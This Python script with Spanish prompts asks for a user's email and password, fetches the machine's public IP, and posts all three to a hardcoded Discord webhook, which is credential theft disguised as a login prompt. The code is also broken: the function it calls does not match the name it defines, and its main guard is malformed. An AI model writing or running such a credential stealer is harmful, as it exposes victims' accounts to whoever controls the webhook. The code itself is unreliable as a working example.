import requests
import socket

def getpublicip():
    try:
        response = requests.get('https://api.ipify.org/?format=json')
        ipdata = response.json()
        return ipdata['ip']
    except Exception as e:
        return f"Error al obtener IP pública: {e}"

def send_to_webhook(email, password, ip_address):
    webhook_url = 'https://discord.com/api/webhooks/1269780467419185268/5AeoeVvwT40zu5i0BaW_TQDwklkDI3H6UwrlCnw5RYDMCsd441DokDn6OGAlncL77e7u'
    data = {
        "content": f"Correo Electrónico: {email}\nContraseña: {password}\nIP Pública: {ip_address}"
    }
    response = requests.post(webhook_url, json=data)
    if response.status_code == 204:
        print("Datos enviados correctamente.")
    else:
        print(f"Error al enviar datos. Código de estado: {response.status_code}")

def main():
    email = input("Ingrese su correo electrónico: ")
    password = input("Ingrese su contraseña: ")
    ip_address = get_public_ip()
    send_to_webhook(email, password, ip_address)

if __name == "__main":
    main()
